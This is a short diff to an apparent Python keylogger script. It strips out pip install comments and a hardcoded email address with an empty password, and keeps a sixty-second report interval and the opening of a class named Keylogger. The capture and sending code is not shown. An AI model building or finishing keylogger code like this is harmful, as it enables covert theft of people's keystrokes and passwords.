@@ -1,8 +1,4 @@
 
-# installing the model "keyboard" using pip
-# pip install keyboard
-# it is used to get the keyboard input from the user
-
 """ This module allows you to take complete control of your keyboard,
  hook global events, register hotkeys, simulate key presses,
  and much more."""
@@ -12,8 +8,7 @@ from datetime import datetime # for getting the current time
 
 # initializing the variables
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "donet32722@jwsuns.com"
-EMAIL_PASSWORD = ""
+
 
 # creating the keylogger
 class Keylogger:
